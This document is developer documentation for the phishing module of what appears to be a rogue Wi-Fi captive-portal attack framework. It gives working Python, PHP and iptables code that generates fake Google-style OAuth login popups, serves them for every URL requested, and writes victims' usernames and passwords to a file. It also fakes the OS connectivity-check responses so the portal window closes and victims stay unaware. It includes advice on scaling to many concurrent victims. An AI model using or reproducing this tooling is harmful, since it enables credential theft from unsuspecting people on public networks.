# 04. Module Deep Dive: BITB (PHP Sinkhole)

The Browser-in-the-Browser (BITB) module is the foundational payload in this framework. It uses PHP's built-in web server to simulate an OAuth login popup inside the Captive Network Assistant (CNA).

---

## 1. Payload Generation (`bitb.py`)

When the Orchestrator starts BITB, it passes a `--target` argument (e.g., `google`).
`bitb.py` is invoked to dynamically generate the HTML payload.

### The Template Replacement
```python
template = template.replace("XX-TITLE-XX", site_title)
template = template.replace("XX-DOMAIN-NAME-XX", domain_name)
```
**Explanation:** It reads the base `main.html` file (which contains the CSS and JavaScript for the draggable fake window) and injects the specific phishing target's details.

### The Base64 Favicon Trick
```python
encoded_string = base64.b64encode(image_file.read()).decode("utf-8")
```
**Explanation:** It reads the target's `favicon.png` and converts it into a Base64 string embedded directly into the HTML (`<img src="data:image/png;base64,...">`). 
*Why?* Inside a captive portal, the victim has absolutely zero internet access. If the HTML tries to load `<img src="https://google.com/favicon.ico">`, the image will fail to load, breaking the illusion. Every single asset (CSS, JS, images) must be inlined or hosted locally.

### Spawning the PHP Server
```python
subprocess.Popen(["php", "-S", "0.0.0.0:8080", "router.php"], stdout=subprocess.DEVNULL)
```
**Explanation:** We bypass the need for Apache or Nginx by using PHP's built-in development server. It listens on all interfaces (`0.0.0.0`) on port `8080`. 

---

## 2. The Universal Sinkhole (`router.php`)

Because `iptables` routes *all* web traffic to port 8080, `router.php` receives thousands of requests that have nothing to do with our phishing page (e.g., background apps trying to sync).

### The Static File Handler
```php
if (file_exists($filePath) && !is_dir($filePath)) {
    return false;
}
```
**Explanation:** If the phone requests a file that actually exists on our disk (like `style.css` or `script.js`), PHP serves it normally.

### The Connectivity Probe Hijack (The 204 Trick)
```php
if (file_exists("/tmp/bitb_allowed_{$clientIp}")) {
    if (strpos($path, 'generate_204') !== false ||
        strpos($path, 'success.txt')  !== false ||
        strpos($path, 'connecttest')  !== false) {
        header("HTTP/1.1 204 No Content");
        header("Content-Length: 0");
        exit();
    }
}
```
**Explanation:** 
When the Captive Portal opens on a victim's phone, the OS constantly sends HTTP requests in the background to URLs like `http://connectivitycheck.gstatic.com/generate_204`. 
If our server returns HTML (the phishing page), the OS thinks "Ah, the portal is still active, keep the window open."
However, if the victim successfully logs in, `login.php` creates a file `/tmp/bitb_allowed_{IP}`. The next time the OS probes `generate_204`, `router.php` catches it and immediately responds with **HTTP Status 204 (No Content)**. 
**The Magic:** The Android/iOS network stack sees the 204, assumes it has reached the actual Google/Apple server on the real internet, and immediately and automatically closes the Captive Portal window on the victim's screen.

### The Catch-All
```php
require __DIR__ . '/index.html';
```
If the IP is not whitelisted, no matter what URL the victim requested, we serve the generated `index.html` (the phishing payload).

---

## 3. The Backend Capture (`login.php`)

This is the file targeted by the `action="login.php"` attribute in the HTML forms.

1. **Capture:** 
   ```php
   file_put_contents($_SERVER['DOCUMENT_ROOT'] . '/sites/userpass/usernames.txt', "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . " [IP: $ip] [Time: " . date("Y-m-d H:i:s") . "]\n", FILE_APPEND);
   ```
   It extracts the form data and appends it to the flat text file that the Orchestrator watches.
   
2. **Whitelist Trigger:** 
   ```php
   exec("sudo " . escapeshellarg($_SERVER["DOCUMENT_ROOT"] . "/whitelist.sh") . " " . escapeshellarg($ip));
   ```
   It executes the bash whitelist script.

3. **The Whitelist Script (`whitelist.sh`):**
   ```bash
   touch "/tmp/bitb_allowed_${1}"
   iptables -t nat -I PREROUTING -s "${1}" -j ACCEPT
   ```
   **Explanation:** The script creates the `/tmp` file to enable the PHP 204 trick. Then, it inserts an `ACCEPT` rule at the *very top* of the `PREROUTING` chain. This means the victim's future packets will bypass our DNAT port-forwarding rules and flow straight out to the real internet. The victim is now "online", completely unaware they were just phished.

---

## 4. Developer FAQ: BITB Edition

**Q: Why use PHP's built-in server instead of Apache/Nginx?**
**A:** Portability and zero configuration. Apache requires complex VirtualHost setups and permissions. `php -S` can be spawned instantly via a one-liner and handles the `router.php` sinkhole natively without `.htaccess` rewrite rules. *Refactoring Advice:* If you need to handle hundreds of concurrent victims, PHP's built-in server will bottleneck (it is single-threaded). Refactor to Nginx + PHP-FPM or rewrite the sinkhole in Go (`net/http`).

**Q: What happens if `router.php` crashes?**
**A:** PHP's built-in server will return a 500 Internal Server Error, and the captive portal page on the victim's phone will display a blank white page with an error. 

**Q: How do we bypass HSTS (HTTP Strict Transport Security) in the Captive Portal?**
**A:** We don't. And we don't have to. The Captive Network Assistant (CNA) browser on iOS/Android intentionally reaches out to an **unencrypted HTTP** endpoint (e.g., `http://captive.apple.com`). Our DNS sinkhole and `iptables` intercept this plaintext request and serve the payload. If you attempt to DNAT an `https://` request without a valid trusted root certificate installed on the victim's device, the browser will throw a fatal certificate error. Always rely on the OS's native HTTP captive portal probe.
